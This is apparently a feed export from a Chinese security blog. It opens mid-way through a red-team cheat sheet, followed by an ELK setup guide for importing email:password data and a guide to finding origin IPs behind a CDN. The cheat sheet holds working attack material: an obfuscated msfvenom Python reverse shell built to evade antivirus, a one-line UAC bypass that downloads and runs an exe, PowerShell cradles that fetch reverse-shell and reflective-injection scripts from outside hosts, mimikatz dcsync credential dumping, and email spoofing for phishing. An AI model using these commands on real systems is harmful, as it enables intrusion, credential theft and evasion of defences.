vpn.dmp</span><br><span class="line">strings vpn.dmp | grep -F &apos;PIN:&apos; -A 6</span><br></pre></td></tr></table></figure><h2 id="免杀shellcode"><a href="#免杀shellcode" class="headerlink" title="免杀shellcode"></a>免杀shellcode</h2><blockquote><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a><br>msf生成.c文件<br>流量走https，防止被监听/察觉出异常</p></blockquote><h3 id="python-msf-bypass"><a href="#python-msf-bypass" class="headerlink" title="python msf bypass"></a>python msf bypass</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">注意！python要在<span class="number">3.4</span>以下,先安装py2exe </span><br><span class="line">python –m pip install py2exe </span><br><span class="line"></span><br><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.78</span><span class="number">.128</span> LPORT=<span class="number">9233</span>  -f raw &gt; start.py</span><br><span class="line"></span><br><span class="line">生成如下：</span><br><span class="line"><span class="keyword">import</span> base64,sys;exec(base64.b64decode(&#123;<span class="number">2</span>:str,<span class="number">3</span>:<span class="keyword">lambda</span> b:bytes(b,<span class="string">'UTF-8'</span>)&#125;[sys.version_info[<span class="number">0</span>]](<span class="string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguNzguMTI4Jyw5MjMzKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg=='</span>)))</span><br><span class="line"></span><br><span class="line">进行一次rot13编码：</span><br><span class="line"><span class="keyword">import</span> getpass,string</span><br><span class="line">rot13 = str.maketrans(<span class="string">"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz"</span>,<span class="string">"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"</span>);</span><br><span class="line"></span><br><span class="line">最后结果：</span><br><span class="line"><span class="keyword">import</span> getpass,base64,sys,string;rot13 = str.maketrans(<span class="string">"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz"</span>,<span class="string">"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"</span>);exec(base64.b64decode(&#123;<span class="number">2</span>:str,<span class="number">3</span>:<span class="keyword">lambda</span> b:bytes(b,<span class="string">'UTF-8'</span>)&#125;[sys.version_info[<span class="number">0</span>]](<span class="string">'nJ1jo3W0VUAiL2gyqPkmqUW1L3DfqTygMDczo3VtrPOcovOlLJ5aMFtkZPx6Pty0pax6PtxWpm1mo2AeMKDhp29wn2I0XQVfp29wn2I0YyACD0gsH1EFEHSAXDbWPKZhL29hozIwqPtbWmR5Zv4kAwthAmthZGV4Wlj5ZwZmXFxXPDyvpzIunjbWMKuwMKO0BtbWPKEcoJHhp2kyMKNbAFxXoQ1mqUW1L3DhqJ5jLJAeXPp+FFpfpl5lMJA2XQDcXIfjKDcxCKZhpzIwqvufXDc3nTyfMFOfMJ4bMPx8oQbXPJDeCKZhpzIwqvufYJkyovuxXFxXMKuyLluxYUfaplp6p30cPt=='</span>.translate(rot13))))</span><br><span class="line"></span><br><span class="line">生成exe:</span><br><span class="line">python -m py2exe.build_exe start.py --bundle-files <span class="number">0</span></span><br></pre></td></tr></table></figure><p>golang<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">go</span> build -ldflags <span class="string">"-w -s"</span> </span><br><span class="line"></span><br><span class="line">msfconsole -x <span class="string">"use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 3232;exploit"</span></span><br></pre></td></tr></table></figure></p><blockquote><p><a href="https://weekly-geekly.github.io/articles/459168/index.html" target="_blank" rel="noopener">https://weekly-geekly.github.io/articles/459168/index.html</a></p></blockquote><h3 id="AVIator"><a href="#AVIator" class="headerlink" title="AVIator"></a>AVIator</h3><p>使用cs配合AVIator生成免杀文件</p><p><a href="https://github.com/Ch0pin/AVIator#usage" target="_blank" rel="noopener">使用方法查看github usage</a><br>转换c#，代码比较糙<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">'payload.cs'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">result=re.findall(<span class="string">r'&#123;(.*)&#125;'</span>,f)[<span class="number">0</span>].replace(<span class="string">' '</span>,<span class="string">''</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(result),<span class="number">80</span>):</span><br><span class="line">    print(result[i:i+<span class="number">80</span>])</span><br></pre></td></tr></table></figure></p><p>微步 0/24<br><img src="https://i.loli.net/2019/10/23/kVEef3olTPI8JFO.png" alt="国内查杀情况"><br>virustotal 17/68<br><img src="https://i.loli.net/2019/10/23/vLj7tkHb3AWY9DV.png" alt="21.png"><br>比作者6个月前的检出率高很多了。。。</p><blockquote><p><a href="https://github.com/Ch0pin/AVIator" target="_blank" rel="noopener">https://github.com/Ch0pin/AVIator</a></p></blockquote><h3 id="ps1"><a href="#ps1" class="headerlink" title="ps1"></a>ps1</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned   <span class="comment">#若使用出现报错先开启权限，需要管理员权限</span></span><br></pre></td></tr></table></figure><h2 id="uac-bypass"><a href="#uac-bypass" class="headerlink" title="uac bypass"></a>uac bypass</h2><p>一键反弹shell<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Windowstyle Hidden Start-BitsTransfer -Priority foreground -Source <span class="string">'https://github.com/IVorder/f_list/raw/master/calc.exe'</span> -Destination <span class="string">"C:\Windows\Temp\prox.exe"</span>;<span class="built_in">New-Item</span> <span class="string">"HKCU:\software\classes\ms-settings\shell\open\command"</span> -Force;<span class="built_in">New-ItemProperty</span> <span class="string">"HKCU:\software\classes\ms-settings\shell\open\command"</span> -Name <span class="string">"DelegateExecute"</span> -Value <span class="string">""</span> -Force;<span class="built_in">Set-ItemProperty</span> <span class="string">"HKCU:\software\classes\ms-settings\shell\open\command"</span> -Name <span class="string">"(default)"</span> -Value <span class="string">"C:\Windows\Temp\prox.exe"</span> -Force;<span class="built_in">Start-Process</span> <span class="string">"C:\Windows\System32\ComputerDefaults.exe"</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">New-Item &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Force</span><br><span class="line">New-ItemProperty &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force</span><br><span class="line">Set-ItemProperty &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Name &quot;(default)&quot; -Value &quot;#&#123;executable_binary&#125;&quot; -Force</span><br><span class="line">Start-Process &quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span><br></pre></td></tr></table></figure><p>清除<br><code>Remove-Item &quot;HKCU:\software\classes\mscfile&quot; -force -Recurse</code></p><blockquote><p><a href="https://github.com/redcanaryco/atomic-red-team" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team</a></p></blockquote><h3 id="添加user"><a href="#添加user" class="headerlink" title="添加user"></a>添加user</h3><p><a href="https://xz.aliyun.com/t/4078" target="_blank" rel="noopener">https://xz.aliyun.com/t/4078</a></p><p><code>gcc adduser.c -l netapi32 -o adduser64.exe</code><br><a href="https://github.com/jas502n/adduser" target="_blank" rel="noopener">https://github.com/jas502n/adduser</a></p><h2 id="提权（powershell）"><a href="#提权（powershell）" class="headerlink" title="提权（powershell）"></a>提权（powershell）</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">echo ^<span class="variable">$d</span> = <span class="built_in">New-Object</span> System.Net.WebClient &gt;&gt; c:\KRECYCLE\<span class="number">1</span>.ps1 </span><br><span class="line">&amp; echo ^<span class="variable">$d</span>.DownloadFile(^<span class="string">"http://127.0.0.1/others/</span></span><br><span class="line"><span class="string">64.exe^"</span>,^<span class="string">"c:\KRECYCLE\3.exe^"</span>) &gt;&gt; c:\KRECYCLE\<span class="number">1</span>.ps1</span><br><span class="line"></span><br><span class="line">powershell -ExecutionPolicy Bypass -File c:\KRECYCLE\<span class="number">1</span>.ps1</span><br><span class="line"></span><br><span class="line">VPS </span><br><span class="line">nc -vlp <span class="number">8888</span> </span><br><span class="line"></span><br><span class="line">反弹powershell的shell </span><br><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://</span></span><br><span class="line"><span class="string">raw.githubusercontent.com/samratashok/nishang/</span></span><br><span class="line"><span class="string">9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/InvokePowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -Reverse -IPAddress VpsIp -</span><br><span class="line">port <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>加载远程的exe到内存中执行，从而绕过杀软</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://</span></span><br><span class="line"><span class="string">raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/</span></span><br><span class="line"><span class="string">CodeExecution/Invoke-ReflectivePEInjection.ps1'</span>);InvokeReflectivePEInjection -PEUrl http://vpsip/down/ms16-<span class="number">032</span>_x64.exe -</span><br><span class="line">ExeArgs <span class="string">'whoami'</span> -ForceASLR</span><br></pre></td></tr></table></figure><p>powershell目录:<br><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p><h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><p>影响范围：windows server </p><p>权限：<br>域管理员可登陆域下任意主机<br>域权限能够读取本地文件</p><p>入侵主机后 查看 net group/domain</p><p>工具：<br>cain<br>mimikatz<br>chromepass</p><p>提权漏洞：<br>cve-2019-10040</p><p>获取域管后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\NTDS\NTDS.dit  #获取到域所以用户的密码</span><br><span class="line">lsadump::dcsync /domain:pentestlab.local /all /csv  #mimikatz</span><br></pre></td></tr></table></figure></p><h1 id="红蓝总结"><a href="#红蓝总结" class="headerlink" title="红蓝总结"></a>红蓝总结</h1><h2 id="redteam细节"><a href="#redteam细节" class="headerlink" title="redteam细节"></a>redteam细节</h2><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>伪造邮箱<br><code>nslookup -type=txt 163.com</code> 查看目标邮件防护措施<br><code>swaks --data aaa.eml--h-from &quot;=?gb18030?B?x+XLrg==?=&lt;admin@qq.com&gt;&quot;  --from bbb@vul.com --to 11@qq.com --server mail.vul.com -au  user  -ap pass</code></p><blockquote><p><a href="https://www.jianshu.com/p/671bce334ea7" target="_blank" rel="noopener">https://www.jianshu.com/p/671bce334ea7</a></p></blockquote><h3 id="c2隐藏"><a href="#c2隐藏" class="headerlink" title="c2隐藏"></a>c2隐藏</h3><blockquote><p><a href="http://test666.me/archives/227/" target="_blank" rel="noopener">http://test666.me/archives/227/</a><br><a href="https://xz.aliyun.com/t/4509" target="_blank" rel="noopener">https://xz.aliyun.com/t/4509</a></p></blockquote><blockquote><p><a href="https://github.com/jas502n/RedTeam-BCS" target="_blank" rel="noopener">https://github.com/jas502n/RedTeam-BCS</a><br><a href="https://evilwing.me/2019/04/14/redteam-gong-ji-ji-qiao-he-an-quan-fang-yu/" target="_blank" rel="noopener">https://evilwing.me/2019/04/14/redteam-gong-ji-ji-qiao-he-an-quan-fang-yu/</a></p></blockquote><h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><p>Exploits &amp; Shellcodes: <a href="https://github.com/offensive-security/exploitdb" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb</a><br>Binary Exploits: <a href="https://github.com/offensive-security/exploitdb-bin-sploits" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits</a><br>Papers: <a href="https://github.com/offensive-security/exploitdb-papers" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-papers</a></p><h1 id="日志清扫"><a href="#日志清扫" class="headerlink" title="日志清扫"></a>日志清扫</h1><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="文件伪造"><a href="#文件伪造" class="headerlink" title="文件伪造"></a>文件伪造</h2><h3 id="md5-伪造"><a href="#md5-伪造" class="headerlink" title="md5 伪造"></a>md5 伪造</h3><p>支持伪造：</p><ul><li>pdf</li><li>jpg</li><li>png</li><li>mp4</li><li>pe</li><li>jp2</li></ul><p>使用方法：如图所示（其余script类同）<br><img src="https://i.loli.net/2019/01/10/5c36e1a4a05a8.png" alt="1.png"></p><p><a href="https://github.com/corkami/collisions" target="_blank" rel="noopener">md5文件伪造：工具地址</a></p><p>关于pdf生成：</p><ul><li><code>pocs/pdf/</code>中提供图片(jpg/png)/文字转换pdf</li><li>或者使用word打印转换pdf</li></ul><p><strong>[!]</strong>  <code>pdf.py</code>需要先安装mutool工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mupdf-tools</span><br></pre></td></tr></table></figure><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>安全检查脚本：<a href="https://github.com/T0xst/linux" target="_blank" rel="noopener">https://github.com/T0xst/linux</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>cnvd共享库</p><blockquote><p><a href="http://www.cnvd.org.cn/shareData/list" target="_blank" rel="noopener">http://www.cnvd.org.cn/shareData/list</a></p></blockquote><p>[+]漏洞挖掘</p><ul><li>框架</li><li>中间件</li><li>协议</li><li>加密算法</li><li>语言</li></ul><p>函数细节:</p><ul><li>安全面<br>– 小众函数 导致的绕过<br>– 编码类型 导致的绕过<br>– 解析调用 导致的绕过<br>– 特性+正常函数组合调用</li></ul><p>[+]利用链思路</p><ul><li>漏洞扩大<br>– 多漏洞组合</li></ul><p>-蜜罐<br>– 读取信息？<br>– rce？<br>– 污染攻击脚本(源端)，通过攻击脚本传播恶意文件</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;hr&gt;
&lt;p&gt;声明:此文章为平时学习积累的知识索引，会大量引用大佬们的东西&lt;/p&gt;
&lt;h2 id=&quot;并且会持续更新……&quot;&gt;&lt;a href=&quot;#并且会持续更新……&quot; class=&quot;headerlink&quot; title=&quot;并且会持续更新……&quot;&gt;&lt;/a&gt;并且会
      
    
    </summary>
    
    
    
      <category term="索引" scheme="http://Vorders.me/tags/%E7%B4%A2%E5%BC%95/"/>
    
      <category term="bypass" scheme="http://Vorders.me/tags/bypass/"/>
    
      <category term="cors" scheme="http://Vorders.me/tags/cors/"/>
    
      <category term="xss bypass" scheme="http://Vorders.me/tags/xss-bypass/"/>
    
      <category term="upload file" scheme="http://Vorders.me/tags/upload-file/"/>
    
      <category term="webshell bypass" scheme="http://Vorders.me/tags/webshell-bypass/"/>
    
      <category term="md5文件伪造" scheme="http://Vorders.me/tags/md5%E6%96%87%E4%BB%B6%E4%BC%AA%E9%80%A0/"/>
    
      <category term="flask session" scheme="http://Vorders.me/tags/flask-session/"/>
    
      <category term="命令执行bypass" scheme="http://Vorders.me/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/"/>
    
      <category term="反序列化" scheme="http://Vorders.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="sqli bypass" scheme="http://Vorders.me/tags/sqli-bypass/"/>
    
      <category term="shellcode bypass" scheme="http://Vorders.me/tags/shellcode-bypass/"/>
    
  </entry>
  
  <entry>
    <title>初入ELK</title>
    <link href="http://vorders.me/2018/12/19/%E5%88%9D%E5%85%A5elk/"/>
    <id>http://vorders.me/2018/12/19/%E5%88%9D%E5%85%A5elk/</id>
    <published>2018-12-19T02:23:33.000Z</published>
    <updated>2019-07-16T14:58:59.720Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>/*<br>本环境使用docker-elk搭建<br>*/</p></blockquote><h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>安装docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh</span><br></pre></td></tr></table></figure></p><p>安装docker-compose:1.6<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose==1.6</span><br></pre></td></tr></table></figure></p><p>clone  docker-elk代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/deviantony/docker-elk.git</span><br></pre></td></tr></table></figure></p><p>于docker-elk目录使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure></p><p><strong>[!]</strong> 如果遇到<strong>invalid reference formation</strong>分别修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/elasticsearch/Dockerfile   </span><br><span class="line">/logstash/Dockerfile</span><br><span class="line">/kibana/Dockerfile</span><br><span class="line">除第一行ARG ELK_VERSION以外的ELK_VERSION 修改为6.5.2</span><br></pre></td></tr></table></figure></p><blockquote><p>window及其其他环境下参考—-官方文档：<a href="https://github.com/deviantony/docker-elk" target="_blank" rel="noopener">https://github.com/deviantony/docker-elk</a></p></blockquote><h2 id="汉化kibana"><a href="#汉化kibana" class="headerlink" title="汉化kibana"></a>汉化kibana</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a <span class="comment">#找到kibana的docker 容器id</span></span><br><span class="line">docker <span class="built_in">exec</span> -it xxxxxx(容器id)  /bin/bash</span><br><span class="line">mkdir cn </span><br><span class="line"><span class="built_in">cd</span> cn</span><br><span class="line">mkdir config</span><br><span class="line">curl -o config/kibana_resource.json  https://raw.githubusercontent.com/anbai-inc/Kibana_Hanization/master/config/kibana_resource.json                        </span><br><span class="line">curl -O https://raw.githubusercontent.com/anbai-inc/Kibana_Hanization/master/main.py</span><br><span class="line">python main.py <span class="string">"/usr/share/kibana"</span></span><br></pre></td></tr></table></figure><blockquote><p>ps:6.5.2暴毙，很不巧的是,我所使用环境也是6.5.2</p></blockquote><h1 id="导入阶段"><a href="#导入阶段" class="headerlink" title="导入阶段"></a>导入阶段</h1><h2 id="创建ES"><a href="#创建ES" class="headerlink" title="创建ES"></a>创建ES</h2><p>创建索引<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Content-Type: application/json'</span> -XPUT <span class="string">'127.0.0.1:9200/14e'</span> -d <span class="string">'&#123;&#125;'</span></span><br></pre></td></tr></table></figure></p><p>创建映射(6.x后移除string类型,index变为boolean)<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Content-Type:application/json'</span> -XPUT <span class="string">'127.0.0.1:9200/14e/data0/_mapping'</span> -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "data0": &#123;</span></span><br><span class="line"><span class="string">        "properties": &#123;</span></span><br><span class="line"><span class="string">            "email": &#123;</span></span><br><span class="line"><span class="string">                "type": "text" </span></span><br><span class="line"><span class="string">            &#125;, </span></span><br><span class="line"><span class="string">            "passwd": &#123;</span></span><br><span class="line"><span class="string">                "type": "text" </span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;'</span></span><br></pre></td></tr></table></figure></p><h2 id="设置logstash清洗-导入"><a href="#设置logstash清洗-导入" class="headerlink" title="设置logstash清洗,导入"></a>设置logstash清洗,导入</h2><p>设置/docker-elk/logstash/pipline/logstash.conf<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">tcp &#123;</span><br><span class="line">port =&gt; 5000</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">  mutate&#123;</span><br><span class="line">    split =&gt; [<span class="string">"message"</span>,<span class="string">":"</span>]</span><br><span class="line">    add_field =&gt;&#123;</span><br><span class="line">        <span class="string">"email"</span> =&gt; <span class="string">"%&#123;[message][0]&#125;"</span></span><br><span class="line">        &#125;</span><br><span class="line">    add_field =&gt;&#123;</span><br><span class="line">        <span class="string">"passwd"</span>=&gt; <span class="string">"%&#123;[message][1]&#125;"</span></span><br><span class="line">        &#125;</span><br><span class="line">    remove_field =&gt; [<span class="string">"path"</span>,<span class="string">"message"</span>,<span class="string">"host"</span>,<span class="string">"@version"</span>,<span class="string">"port"</span>]<span class="comment">#去掉一些不想显示的字段</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts =&gt; <span class="string">"elasticsearch:9200"</span></span><br><span class="line">index =&gt; <span class="string">"14e"</span></span><br><span class="line">document_type =&gt; <span class="string">"data0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>index_type字段已改，大坑：<a href="https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#plugins-outputs-elasticsearch-document_type" target="_blank" rel="noopener">https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#plugins-outputs-elasticsearch-document_type</a><br>关于分割参考官网文档：<a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-split.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/logstash/current/plugins-filters-split.html</a><br>logstash详细写法参考此文章：<a href="https://doc.yonyoucloud.com/doc/logstash-best-practice-cn" target="_blank" rel="noopener">https://doc.yonyoucloud.com/doc/logstash-best-practice-cn</a></p></blockquote><p>nc 传入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 5000 &lt; 0</span><br></pre></td></tr></table></figure></p><p>nc 批量传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 5000 &lt; ./*</span><br></pre></td></tr></table></figure></p><p>静候载入。<br><img src="https://i.loli.net/2018/12/20/5c1b6ff633c80.png" alt="结果展示"></p><h1 id="建立图表分析"><a href="#建立图表分析" class="headerlink" title="建立图表分析"></a>建立图表分析</h1><p>create pie-&gt;split slices</p><p>split slices下的sub Aggregation选择filters<br>分别添加filters<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email:&quot;xxxx.xx&quot;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/12/21/5c1c42c4646df.png" alt="22.png"></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>logstash对于空字段未经判断=&gt;导致passwd出现<code>%{[message][1]}</code><br>\ux15等乱码字符未处理<br>数据还没导完..<br>其他功能还没试玩..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;/*&lt;br&gt;本环境使用docker-elk搭建&lt;br&gt;*/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;准备阶段&quot;&gt;&lt;a href=&quot;#准备阶段&quot; class=&quot;headerlink&quot; title=&quot;准备阶段&quot;&gt;&lt;/a&gt;准备阶段&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="ELK" scheme="http://Vorders.me/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>绕过cdn找真实ip</title>
    <link href="http://vorders.me/2018/11/15/%E7%BB%95%E8%BF%87%E4%BA%91waf%E6%89%BE%E7%9C%9F%E5%AE%9Eip/"/>
    <id>http://vorders.me/2018/11/15/%E7%BB%95%E8%BF%87%E4%BA%91waf%E6%89%BE%E7%9C%9F%E5%AE%9Eip/</id>
    <published>2018-11-15T03:20:09.000Z</published>
    <updated>2019-08-27T15:24:37.031Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>个人学习汇总</p></blockquote><p>host目录<code>C:\Windows\System32\drivers\etc</code></p><h1 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h1><p>前2者针对国内，但需收费或注册才能查看详细ip<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">DNSdb</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">X情报</a><br><a href="https://viewdns.info/" target="_blank" rel="noopener">viewDNS</a></p><p>对真实ip绑定白名单访问的网站无效。</p><h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>二级域名可能没设CDN或waf(可能性低)<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">在线子域名爆破</a></p><h1 id="注册邮件-订阅邮件"><a href="#注册邮件-订阅邮件" class="headerlink" title="注册邮件/订阅邮件"></a>注册邮件/订阅邮件</h1><p>当服务器自带邮件发送功能或处于相同网络环境(扫c段)</p><blockquote><p>例子:<a href="https://xz.aliyun.com/t/1761" target="_blank" rel="noopener">https://xz.aliyun.com/t/1761</a></p></blockquote><h1 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h1><p><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a><br><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a><br><a href="https://censys.io/" target="_blank" rel="noopener">censys</a><br><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></p><p>censys<code>80.http.get.headers.server:</code><br>按title,keyword,sitename等搜索</p><blockquote><p>例子(获得5173真实ip)：<a href="https://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/" target="_blank" rel="noopener">https://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/</a></p></blockquote><h1 id="Zgrab探测"><a href="#Zgrab探测" class="headerlink" 